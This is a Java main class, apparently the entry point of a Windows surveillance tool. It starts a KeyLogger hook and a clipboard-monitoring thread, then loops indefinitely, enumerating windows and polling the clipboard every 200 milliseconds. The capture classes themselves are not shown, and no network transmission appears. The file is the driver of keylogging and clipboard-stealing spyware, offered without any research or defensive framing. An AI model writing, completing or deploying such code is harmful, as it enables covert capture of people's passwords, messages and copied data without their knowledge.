import com.sun.jna.platform.win32.WinDef;

public class MainDriver {
    private static final int intervalDuration = 10;
    public static WinDef.HWND prevFg = null;

    public static void main(String[] args) {
        KeyLogger keyLogger = new KeyLogger();
        ClipBoardMonitor clipBoardMonitor = new ClipBoardMonitor();
        EnumerateWindows enumerateWindows = new EnumerateWindows();
        try {
            keyLogger.startHook();
            ClipBoardMonitor b = new ClipBoardMonitor();
            Thread thread = new Thread(b);
            thread.start();
            while (true) {
                try {
                    Thread.sleep(200);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }

                enumerateWindows.run();
                clipBoardMonitor.run();
            }
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }
}